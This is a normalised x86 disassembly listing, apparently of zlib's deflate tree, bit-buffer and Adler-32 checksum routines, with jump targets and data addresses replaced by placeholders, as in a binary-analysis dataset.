cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edx 0xb0a
call sub_465f50
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edx 0xb16
call sub_465f50
mov eax [ ebp - 0x4 ]
call sub_466cf4
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x1697 ]
add ecx 0xa
shr ecx 0x3
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x169b ]
add edx 0xa
shr edx 0x3
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x10 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_468240
mov [ ebp - 0x24 ] 0x3
mov eax [ ebp - 0x4 ]
mov ecx 0x10
sub ecx [ ebp - 0x24 ]
cmp ecx [ eax + 0x16ad ]
jge r-xdata
mov [ ebp - 0x1c ] 0x3
mov ecx [ ebp - 0x4 ]
mov edx 0x10
sub edx [ ebp - 0x1c ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467190
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x4
cmp eax [ ebp - 0x10 ]
ja r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ax 0x4
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x24 ]
add [ edx + 0x16ad ] eax
mov edx [ ebp + 0x8 ]
add edx 0x4
mov [ ebp - 0x28 ] edx
mov ax [ ebp - 0x28 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ ebp - 0x28 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov ax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ax 0x2
mov edx [ ebp - 0x4 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x1c ]
add [ edx + 0x16ad ] eax
mov eax [ ebp + 0x8 ]
add eax 0x2
mov [ ebp - 0x20 ] eax
mov ax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x16ad ]
mov edx [ ebp - 0x4 ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16ab ] ax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_465904
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x169f ]
shr eax 0x3
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
call sub_4683ec
mov edx [ ebp - 0x4 ]
add [ edx + 0x169f ] 0x7
mov ecx [ ebp - 0x18 ]
inc ecx
push ecx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax + 0xb1a ]
mov edx [ edx + 0xb0e ]
inc ecx
inc edx
mov eax [ ebp - 0x4 ]
call sub_466d90
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
add ecx 0x97a
add edx 0x86
mov eax [ ebp - 0x4 ]
call sub_467b6c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x1697 ]
add eax 0x3
add [ edx + 0x169f ] eax
mov ecx rw-data
mov edx rw-data
mov eax [ ebp - 0x4 ]
call sub_467b6c
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x169b ]
add eax 0x3
add [ edx + 0x169f ] eax
jmp r-xdata
sub_4679e4
add esp 0xffffffe0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x1693 ]
mov eax [ ecx + 0x168f ]
mov cx [ esp + 0x4 ]
mov [ edx + eax * 2 ] cx
mov edx [ esp ]
mov eax [ edx + 0x168f ]
inc [ edx + 0x168f ]
mov edx [ esp ]
mov ecx [ edx + 0x1687 ]
mov dl [ esp + 0x8 ]
mov [ ecx + eax ] dl
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov eax [ esp ]
inc [ eax + 0x16a3 ]
dec [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
xor ecx ecx
mov cl [ edx + rw-data ]
mov eax [ esp ]
inc [ eax + ecx * 4 + 0x48a ]
cmp [ esp + 0x4 ] 0x100
jae r-xdata
mov eax [ esp + 0x8 ]
mov ecx [ esp ]
inc [ ecx + eax * 4 + 0x86 ]
jmp r-xdata
mov eax [ esp + 0x4 ]
shr eax 0x7
mov cl [ eax + rw-data ]
mov edx [ esp + 0x4 ]
mov cl [ edx + rw-data ]
jmp r-xdata
mov edx [ esp ]
cmp [ edx + 0x76 ] 0x2
jle r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x168b ]
dec ecx
cmp ecx [ eax + 0x168f ]
sete al
and eax 0x1
mov ecx [ esp ]
test [ ecx + 0x168f ] 0xfff
jne r-xdata
xor edx edx
mov dl cl
mov eax [ esp ]
inc [ eax + edx * 4 + 0x97a ]
mov eax [ esp ]
mov edx [ eax + 0x168f ]
shl edx 0x3
mov [ esp + 0xc ] edx
mov ecx [ esp ]
mov edx [ esp ]
mov eax [ ecx + 0x5e ]
sub eax [ edx + 0x4e ]
xor ecx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov [ esp + 0x1c ] rw-data
mov eax [ esp ]
lea edx [ eax + 0x97a ]
mov [ esp + 0x18 ] edx
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x1c ]
movzx eax [ ecx ]
mov ecx [ edx ]
add ecx 0x5
imul ecx
add [ esp + 0xc ] eax
inc [ esp + 0x14 ]
add [ esp + 0x1c ] 0x4
add [ esp + 0x18 ] 0x4
cmp [ esp + 0x14 ] 0x1e
jl r-xdata
shr [ esp + 0xc ] 0x3
mov eax [ esp ]
mov ecx [ esp ]
mov edx [ eax + 0x168f ]
shr edx 0x1
cmp edx [ ecx + 0x16a3 ]
jbe r-xdata
mov eax [ esp + 0x10 ]
shr eax 0x1
cmp eax [ esp + 0xc ]
jbe r-xdata
mov eax 0x1
jmp r-xdata
add esp 0x20
retn
sub_467b6c
add esp 0xffffffb0
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x14 ] eax
mov edx [ esp ]
cmp [ edx + 0x168f ] 0x0
je r-xdata
mov edx [ esp + 0x4 ]
movzx ecx [ edx + 0x402 ]
mov [ esp + 0x48 ] ecx
mov eax 0x10
sub eax [ esp + 0x48 ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov ecx [ esp ]
mov eax [ ecx + 0x1693 ]
mov edx [ esp + 0x14 ]
movzx ecx [ eax + edx * 2 ]
mov [ esp + 0xc ] ecx
mov eax [ esp ]
mov edx [ eax + 0x1687 ]
mov ecx [ esp + 0x14 ]
xor eax eax
mov al [ edx + ecx ]
mov [ esp + 0x10 ] eax
inc [ esp + 0x14 ]
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esp ]
mov dx [ eax + 0x400 ]
mov ecx [ ecx + 0x16ad ]
shl dx cl
mov eax [ esp ]
or [ eax + 0x16ab ] dx
mov ecx [ esp ]
mov edx [ esp + 0x48 ]
add [ ecx + 0x16ad ] edx
mov ecx [ esp + 0x4 ]
movzx eax [ ecx + 0x400 ]
mov [ esp + 0x4c ] eax
mov ax [ esp + 0x4c ]
mov edx [ esp ]
mov ecx [ edx + 0x16ad ]
mov edx [ esp ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ esp ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x4c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x48 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov edx [ esp + 0x10 ]
xor ecx ecx
mov cl [ edx + rw-data ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x18 ]
movzx ecx [ eax + edx * 4 + 0x406 ]
mov [ esp + 0x28 ] ecx
mov eax 0x10
sub eax [ esp + 0x28 ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x10 ]
movzx eax [ edx + ecx * 4 + 0x2 ]
mov [ esp + 0x20 ] eax
mov edx 0x10
sub edx [ esp + 0x20 ]
mov ecx [ esp ]
cmp edx [ ecx + 0x16ad ]
jge r-xdata
mov eax [ esp + 0x4 ]
mov ecx [ esp ]
movzx edx [ eax + 0x402 ]
mov [ ecx + 0x16a7 ] edx
add esp 0x50
retn
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov ax [ eax + edx * 4 + 0x404 ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x28 ]
add [ eax + 0x16ad ] ecx
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x4 ]
movzx edx [ ecx + eax * 4 + 0x404 ]
mov [ esp + 0x2c ] edx
mov ax [ esp + 0x2c ]
mov ecx [ esp ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov ecx [ esp ]
mov eax [ ecx + 0x8 ]
mov ecx [ esp ]
mov cl [ ecx + 0x16ab ]
and cl 0xff
mov [ eax + edx ] cl
mov eax [ esp ]
mov edx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov ecx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ ecx + edx ] al
mov ecx 0x10
movzx eax [ esp + 0x2c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x28 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
mov ecx [ esp ]
mov ax [ eax + edx * 4 ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x20 ]
add [ eax + 0x16ad ] ecx
jmp r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x4 ]
movzx ecx [ eax + edx * 4 ]
mov [ esp + 0x24 ] ecx
mov dx [ esp + 0x24 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x24 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x20 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
dec [ esp + 0xc ]
cmp [ esp + 0xc ] 0x100
jae r-xdata
mov eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
sub [ esp + 0x10 ] edx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x30 ] ecx
mov eax 0x10
sub eax [ esp + 0x30 ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp ]
cmp ecx [ eax + 0x168f ]
jb r-xdata
mov edx [ esp + 0xc ]
shr edx 0x7
mov al [ edx + rw-data ]
mov ecx [ esp + 0xc ]
mov al [ ecx + rw-data ]
jmp r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax [ esp + 0x10 ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x30 ]
add [ edx + 0x16ad ] eax
mov ecx [ esp + 0x10 ]
mov [ esp + 0x34 ] ecx
mov dx [ esp + 0x34 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x34 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x30 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x18 ]
mov ecx [ esp ]
mov ax [ eax + edx * 4 ]
mov edx [ esp ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x38 ]
add [ eax + 0x16ad ] ecx
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x18 ]
movzx eax [ edx + ecx * 4 ]
mov [ esp + 0x3c ] eax
mov ax [ esp + 0x3c ]
mov edx [ esp ]
mov ecx [ edx + 0x16ad ]
mov edx [ esp ]
shl ax cl
or [ edx + 0x16ab ] ax
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ esp ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x3c ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x38 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
xor edx edx
mov dl al
mov [ esp + 0x18 ] edx
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x18 ]
movzx edx [ ecx + eax * 4 + 0x2 ]
mov [ esp + 0x38 ] edx
mov ecx 0x10
sub ecx [ esp + 0x38 ]
mov eax [ esp ]
cmp ecx [ eax + 0x16ad ]
jge r-xdata
mov eax [ esp + 0x18 ]
mov edx [ eax * 4 + rw-data ]
sub [ esp + 0xc ] edx
mov ecx [ esp + 0x1c ]
mov [ esp + 0x40 ] ecx
mov eax 0x10
sub eax [ esp + 0x40 ]
mov edx [ esp ]
cmp eax [ edx + 0x16ad ]
jge r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
cmp [ esp + 0x1c ] 0x0
je r-xdata
mov ecx [ esp ]
mov edx [ esp ]
mov ax [ esp + 0xc ]
mov ecx [ ecx + 0x16ad ]
shl ax cl
or [ edx + 0x16ab ] ax
mov edx [ esp ]
mov eax [ esp + 0x40 ]
add [ edx + 0x16ad ] eax
mov ecx [ esp + 0xc ]
mov [ esp + 0x44 ] ecx
mov dx [ esp + 0x44 ]
mov eax [ esp ]
mov ecx [ eax + 0x16ad ]
mov eax [ esp ]
shl dx cl
or [ eax + 0x16ab ] dx
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov ecx 0x10
movzx eax [ esp + 0x44 ]
mov edx [ esp ]
sub ecx [ edx + 0x16ad ]
sar eax cl
mov edx [ esp ]
mov [ edx + 0x16ab ] ax
mov eax [ esp ]
mov ecx [ esp + 0x40 ]
mov edx [ esp ]
sub ecx 0x10
add ecx [ eax + 0x16ad ]
mov [ edx + 0x16ad ] ecx
jmp r-xdata
sub_468240
add esp 0xffffffe4
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
xor edx edx
mov [ esp + 0x8 ] edx
xor ecx ecx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea edx [ eax + 0x86 ]
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
movzx eax [ ecx ]
add [ esp + 0xc ] eax
inc [ esp + 0x4 ]
add [ esp + 0x10 ] 0x4
cmp [ esp + 0x4 ] 0x7
jl r-xdata
mov edx [ esp ]
mov ecx [ esp + 0x4 ]
lea eax [ edx + ecx * 4 + 0x86 ]
mov [ esp + 0x14 ] eax
cmp [ esp + 0x4 ] 0x80
jge r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
lea ecx [ eax + edx * 4 + 0x86 ]
mov [ esp + 0x18 ] ecx
cmp [ esp + 0x4 ] 0x100
jge r-xdata
mov edx [ esp + 0x14 ]
movzx ecx [ edx ]
add [ esp + 0x8 ] ecx
inc [ esp + 0x4 ]
add [ esp + 0x14 ] 0x4
cmp [ esp + 0x4 ] 0x80
jl r-xdata
xor ecx ecx
mov eax [ esp + 0x8 ]
shr eax 0x2
cmp eax [ esp + 0xc ]
jb r-xdata
mov eax [ esp + 0x18 ]
movzx edx [ eax ]
add [ esp + 0xc ] edx
inc [ esp + 0x4 ]
add [ esp + 0x18 ] 0x4
cmp [ esp + 0x4 ] 0x100
jl r-xdata
mov edx [ esp ]
mov [ edx + 0x18 ] cl
add esp 0x1c
retn
inc ecx
sub_468310
add esp 0xfffffff4
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor eax eax
mov [ esp + 0x8 ] eax
mov edx [ esp ]
and edx 0x1
or [ esp + 0x8 ] edx
shr [ esp ] 0x1
shl [ esp + 0x8 ] 0x1
dec [ esp + 0x4 ]
mov ecx [ esp + 0x4 ]
test ecx ecx
jg r-xdata
mov eax [ esp + 0x8 ]
shr eax 0x1
add esp 0xc
retn
sub_468348
push ecx
mov [ esp ] eax
mov eax [ esp ]
cmp [ eax + 0x16ad ] 0x10
jne r-xdata
mov edx [ esp ]
cmp [ edx + 0x16ad ] 0x8
jl r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
mov edx [ esp ]
mov [ edx + 0x16ab ] 0x0
mov ecx [ esp ]
xor eax eax
mov [ ecx + 0x16ad ] eax
pop edx
retn
pop edx
retn
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
mov [ ecx + eax ] dl
mov eax [ esp ]
shr [ eax + 0x16ab ] 0x8
mov ecx [ esp ]
sub [ ecx + 0x16ad ] 0x8
sub_4683ec
push ecx
mov [ esp ] eax
mov eax [ esp ]
cmp [ eax + 0x16ad ] 0x8
jle r-xdata
mov edx [ esp ]
cmp [ edx + 0x16ad ] 0x0
jle r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
mov al [ eax + 0x16ab ]
and al 0xff
mov [ edx + ecx ] al
mov edx [ esp ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ esp ]
mov edx [ eax + 0x8 ]
mov eax [ esp ]
movzx eax [ eax + 0x16ab ]
sar eax 0x8
mov [ edx + ecx ] al
jmp r-xdata
mov eax [ esp ]
mov [ eax + 0x16ab ] 0x0
mov ecx [ esp ]
xor eax eax
mov [ ecx + 0x16ad ] eax
pop edx
retn
mov ecx [ esp ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ esp ]
mov ecx [ edx + 0x8 ]
mov edx [ esp ]
mov dl [ edx + 0x16ab ]
mov [ ecx + eax ] dl
sub_46847c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4683ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x16a7 ] 0x8
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
add [ ebp - 0xc ] 0xffffffff
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx + 0x10 ]
inc [ ecx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x8 ]
mov dl [ ebp - 0xc ]
and dl 0xff
mov [ ecx + eax ] dl
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
inc [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
movzx eax [ ebp - 0xc ]
sar eax 0x8
mov [ edx + ecx ] al
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov al [ ebp - 0xc ]
not al
and al 0xff
mov [ edx + ecx ] al
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov ax [ ebp - 0xc ]
not ax
movzx eax ax
sar eax 0x8
mov [ edx + ecx ] al
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x10 ]
inc [ edx + 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov [ edx + ecx ] al
inc [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn 0x4
sub_468540
add esp 0xffffffe8
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
and eax 0xffff
mov [ esp + 0xc ] eax
mov edx [ esp ]
shr edx 0x10
and edx 0xffff
mov [ esp + 0x10 ] edx
cmp [ esp + 0x4 ] 0x0
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jbe r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ esp + 0x10 ]
shl eax 0x10
or eax [ esp + 0xc ]
cmp [ esp + 0x8 ] 0x15b0
jae r-xdata
add esp 0x18
retn
mov edx 0x15b0
mov edx [ esp + 0x8 ]
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x1 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x2 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x3 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x4 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x5 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x6 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x7 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x8 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0x9 ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xa ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
add [ esp + 0x10 ] edx
mov ecx [ esp + 0x4 ]
xor eax eax
mov al [ ecx + 0xb ]
add [ esp + 0xc ] eax
mov edx [ esp + 0xc ]
